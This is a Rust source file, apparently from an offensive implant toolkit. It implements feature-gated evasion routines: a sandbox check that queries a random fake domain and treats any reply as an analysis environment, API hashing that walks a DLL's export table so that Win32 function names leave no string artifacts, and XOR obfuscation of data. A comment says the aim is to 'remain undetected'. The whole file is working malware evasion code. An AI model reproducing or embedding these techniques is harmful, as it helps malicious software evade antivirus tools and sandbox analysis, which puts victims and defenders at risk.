use std::error::Error;

// Things Antisand needs
#[cfg(all(windows, feature = "antisand"))]
use rand::distr::Alphanumeric;
#[cfg(all(windows, feature = "antisand"))]
use rand::Rng;

// Things Antistring needs
#[cfg(feature = "antistring")]
use std::collections::hash_map::DefaultHasher;
#[cfg(all(windows, feature = "antistring"))]
use std::ffi::CStr;
#[cfg(feature = "antistring")]
use std::hash::{Hash, Hasher};
#[cfg(all(windows, feature = "antistring"))]
use std::mem;
#[cfg(all(windows, feature = "antistring"))]
use std::ptr;
#[cfg(all(windows, feature = "antistring"))]
use windows::Win32::System::Diagnostics::Debug::{
    IMAGE_DIRECTORY_ENTRY_EXPORT, IMAGE_NT_HEADERS64,
};
#[cfg(all(windows, feature = "antistring"))]
use windows::Win32::System::LibraryLoader::LoadLibraryA;
#[cfg(all(windows, feature = "antistring"))]
use windows::Win32::System::SystemServices::{IMAGE_DOS_HEADER, IMAGE_EXPORT_DIRECTORY};

// Things Antisand and Antistring need
#[cfg(all(windows, feature = "antisand", feature = "antistring"))]
use core::ffi::c_void;
#[cfg(all(windows, any(feature = "antisand", feature = "antistring")))]
use windows::core::PCSTR;

// Things Antisand needs only when Antistring is not set
#[cfg(all(windows, feature = "antisand", not(feature = "antistring")))]
use windows::Win32::Networking::WinInet::{InternetOpenA, InternetOpenUrlA};

/*
    Macros before functions
*/

#[macro_export]
macro_rules! construct_win32_function {
    // Take in:
    //   one x - the function pointer
    //   zero or more y - the function argument data types
    //   zero or more z - the function return data types
    (
        $(
            $x:expr; [ $( $y:ty ),* ]; [ $( $z:ty ),* ]
        );*
    ) => {
        // Interpret the memory at the provided function pointer "x" as a function with args "y" and return "z"
        // Based on https://rust-lang.github.io/unsafe-code-guidelines/layout/function-pointers.html
        //   this is a safe transmute because it will be guaranteed on Windows
        // So the macro is safe despite the unsafe code
        unsafe {
            std::mem::transmute::<*const (), unsafe fn( $($( $y ),*),* ) -> $($( $z ),*),*>($( $x ),*)
        }
    }
}

/*
    Calculate the hash of a hashable value
*/

#[cfg(feature = "antistring")]
pub fn calculate_hash<T: Hash>(t: &T) -> u64 {
    let mut s = DefaultHasher::new();
    t.hash(&mut s);
    s.finish()
}

/*
    Helper function for XOR - makes two slices the same length by repeating the shorter till it's the length of the longer
*/

#[cfg(feature = "xor")]
fn equalize_slice_len<T: std::clone::Clone>(slice_one: &[T], slice_two: &[T]) -> (Vec<T>, Vec<T>) {
    let (longer, shorter) = match slice_one.len() > slice_two.len() {
        true => (slice_one, slice_two),
        false => (slice_two, slice_one),
    };
    (
        longer.to_vec(),
        shorter.iter().cloned().cycle().take(longer.len()).collect(),
    )
}

/*
    Find Win32 function implementation - finds the memory location of a Win32 function in its DLL so it can be called directly
*/

#[cfg(all(windows, feature = "antistring"))]
pub fn find_function_address(
    library_base_usize: usize,
    name_hash: u64,
) -> Result<*const (), Box<dyn Error>> {
    // Get a pointer to the DOS header
    let dos_header: *const IMAGE_DOS_HEADER = library_base_usize as *const IMAGE_DOS_HEADER;

    // Calculate the address of the image headers
    let image_headers: *const IMAGE_NT_HEADERS64 = unsafe {
        (library_base_usize + (*dos_header).e_lfanew as usize) as *const IMAGE_NT_HEADERS64
    };

    // Get the relative virtual address of the export directory
    let export_directory_rva = unsafe {
        (*image_headers).OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT.0 as usize]
            .VirtualAddress
    };
    // Use the RVA to get the real address of the export directory
    let image_export_directory: *const IMAGE_EXPORT_DIRECTORY =
        (library_base_usize + export_directory_rva as usize) as *const IMAGE_EXPORT_DIRECTORY;

    // Calculate the base addresses of the arrays holding function information
    let names_address =
        unsafe { library_base_usize + (*image_export_directory).AddressOfNames as usize };
    let ordinals_address =
        unsafe { library_base_usize + (*image_export_directory).AddressOfNameOrdinals as usize };
    let functions_address =
        unsafe { library_base_usize + (*image_export_directory).AddressOfFunctions as usize };

    // Loop over every function looking for the desired name
    let num_functions = unsafe { (*image_export_directory).NumberOfFunctions };
    for index in 0..num_functions {
        // Help traverse the names array; each 4-byte value is a pointer to a name
        let into_names = mem::size_of::<u32>() * (index as usize);

        // Find the location of the next function name's RVA
        let function_name_rva_address: *const usize = (names_address + into_names) as *const usize;

        // Read the RVA from its location
        let function_name_rva: u32 = unsafe { ptr::read(function_name_rva_address) as u32 };

        // Calculate the function name's real address
        let function_name_address: *const i8 =
            (library_base_usize + function_name_rva as usize) as *const i8;

        // Read the function name from its address
        let function_name = unsafe { CStr::from_ptr(function_name_address).to_string_lossy() };

        // Hash the name
        let function_hash = calculate_hash(&function_name);

        // Compare the hashed name to the name you are looking for
        if function_hash == name_hash {
            // Find the location of the function ordinal's RVA; it's the same index as the name array but each offset is only 2 bytes
            let ordinals_offset_address: *const usize =
                (ordinals_address + (into_names / 2_usize)) as *const usize;

            // Read the RVA from its location
            let ordinal_offset: u16 = unsafe { ptr::read(ordinals_offset_address) as u16 };

            // Find the location of the function address in the address array by using the ordinal offset
            let into_functions = mem::size_of::<u32>() * (ordinal_offset as usize);

            // Calculate the function address's location
            let function_address_rva_address: *const usize =
                (functions_address + into_functions) as *const usize;

            // Read the function address's location from memory
            let function_address_rva: u32 =
                unsafe { ptr::read(function_address_rva_address) as u32 };

            // Calculate the function's real address
            let function_address: *const () =
                (library_base_usize + function_address_rva as usize) as *const ();

            return Ok(function_address);
        }
    }
    Err(format!("Could not find the function '{name_hash:x}'").into())
}

/*
    Find Win32 function implementation - finds the memory location of a Win32 function in its DLL so it can be called directly
*/

#[cfg(all(windows, feature = "antistring"))]
pub fn find_library_address(dll: &str) -> Result<usize, Box<dyn Error>> {
    // Call LoadLibraryA on a DLL to get its base address
    let lib_filename = PCSTR::from_raw(format!("{dll}\0").as_mut_ptr());
    let library_base = match unsafe { LoadLibraryA(lib_filename) } {
        Ok(value) => value,
        Err(_) => panic!("Could not load {lib_filename:?}"),
    };

    Ok(library_base.0 as usize)
}

/*
    Antisand Windows implementation - basically looks to see if something fakes a response to a website
*/

#[cfg(all(windows, feature = "antisand", not(feature = "antistring")))]
pub fn pound_sand() -> bool {
    // Call InternetOpenA to get a handle that can be used in an actual internet request
    // WINDOWS --> https://docs.microsoft.com/en-us/windows/win32/api/wininet/nf-wininet-internetopena
    // RUST --> https://microsoft.github.io/windows-docs-rs/doc/windows/Win32/Networking/WinInet/fn.InternetOpenA.html
    let lpsz_agent = PCSTR::from_raw(String::from("Name in user-agent\0").as_mut_ptr());
    let internet_handle = unsafe { InternetOpenA(lpsz_agent, 0, PCSTR::null(), PCSTR::null(), 0) };

    // Generate a "website" to search for
    let length = rand::rng().random_range(20..40);
    let alphanum: String = rand::rng()
        .sample_iter(&Alphanumeric)
        .take(length)
        .map(char::from)
        .collect();
    let mut full_link: String = "https://www.".to_owned();
    let link_end: String = ".com".to_owned();
    full_link.push_str(&alphanum);
    full_link.push_str(&link_end);

    // Call InternetOpenUrlA on the fake website; if there is a response, it's a sandbox trying to get you to take further action
    // WINDOWS --> https://docs.microsoft.com/en-us/windows/win32/api/wininet/nf-wininet-internetopenurla
    // RUST --> https://microsoft.github.io/windows-docs-rs/doc/windows/Win32/Networking/WinInet/fn.InternetOpenUrlA.html
    let lpsz_url = PCSTR::from_raw(format!("{full_link}\0").as_mut_ptr());
    let website = unsafe { InternetOpenUrlA(internet_handle, lpsz_url, None, 0, Some(0)) };
    if website != 0 as _ {
        return true;
    }
    false
}

/*
    Antisand Windows implementation without string artifacts - basically looks to see if something fakes a response to a website
*/

#[cfg(all(windows, feature = "antisand", feature = "antistring"))]
pub fn pound_sand() -> bool {
    // Get location of Wininet.dll
    let wininet = find_library_address("Wininet").unwrap();

    // See line 90
    let function = find_function_address(wininet, 0x4b98c7b42f5ce34f).unwrap();
    let lpsz_agent = PCSTR::from_raw(String::from("Name in user-agent\0").as_mut_ptr());
    let internet_handle = unsafe {
        mem::transmute::<*const (), fn(PCSTR, i32, PCSTR, PCSTR, i32) -> *mut c_void>(function)(
            lpsz_agent,
            0,
            PCSTR::null(),
            PCSTR::null(),
            0,
        )
    };

    let length = rand::rng().random_range(20..40);
    let alphanum: String = rand::rng()
        .sample_iter(&Alphanumeric)
        .take(length)
        .map(char::from)
        .collect();
    let mut full_link: String = "https://www.".to_owned();
    let link_end: String = ".com".to_owned();
    full_link.push_str(&alphanum);
    full_link.push_str(&link_end);

    // See line 111
    let function = find_function_address(wininet, 0x275e2d4fe536ed19).unwrap();
    let lpsz_url = PCSTR::from_raw(format!("{full_link}\0").as_mut_ptr());
    let website = unsafe {
        mem::transmute::<*const (), fn(*mut c_void, PCSTR, &[u8], u32, usize) -> *mut c_void>(
            function,
        )(internet_handle, lpsz_url, &[], 0, 0)
    };
    if website != 0 as _ {
        return true;
    }
    false
}

/*
    Antisand Linux implementation - since I currently don't need to do this to remain undetected it's a dummy (does nothing)
*/

#[cfg(all(target_os = "linux", feature = "antisand"))]
pub fn pound_sand() -> bool {
    false
}

/*
    Antisand not-asked-for "implementation" - this is a dummy that will never do anything except make the compiler happy
*/

#[cfg(not(feature = "antisand"))]
pub fn pound_sand() -> bool {
    false
}

/*
    XOR implementation - takes in a key and a value and outputs the key ^ value byte-bye-byte
*/

#[cfg(feature = "xor")]
pub fn xor_encrypt_decrypt(key: &[u8], text: &[u8]) -> Result<Vec<u8>, Box<dyn Error>> {
    let equalilzed = equalize_slice_len(key, text);
    let key: &[u8] = &equalilzed.0[..];
    let text: &[u8] = &equalilzed.1[..];
    xor_u8_slices(key, text)
}

/*
    XOR not-asked-for "implementation" - this is a dummy that will never do anything except make the compiler happy
*/

#[cfg(not(feature = "xor"))]
pub fn xor_encrypt_decrypt(_key: &[u8], text: &[u8]) -> Result<Vec<u8>, Box<dyn Error>> {
    Ok(text.to_vec())
}

/*
    Helper function for XOR - XORs two slices of equal length
*/

#[cfg(feature = "xor")]
fn xor_u8_slices(slice_one: &[u8], slice_two: &[u8]) -> Result<Vec<u8>, Box<dyn Error>> {
    if slice_one.len() != slice_two.len() {
        return Err("The given slices are not the same length".into());
    }
    Ok(slice_one
        .iter()
        .zip(slice_two.iter())
        .map(|(&x1, &x2)| x1 ^ x2)
        .collect())
}
